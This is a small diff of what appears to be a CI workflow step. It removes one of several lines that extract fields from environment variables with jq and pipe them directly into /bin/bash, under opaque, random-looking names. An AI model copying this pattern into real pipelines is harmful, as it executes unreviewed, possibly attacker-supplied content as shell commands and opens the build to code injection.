@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$pa0" | jq -r .tx5 | /bin/bash
           echo $mq246 | jq -r .mqlj19860 | /bin/bash
-          echo $x8 | jq -r .cpo92032 | /bin/bash
           printf '%s' "$mgkd52167" | jq -r .qosme4 | /bin/bash
 
       - name: Upload results
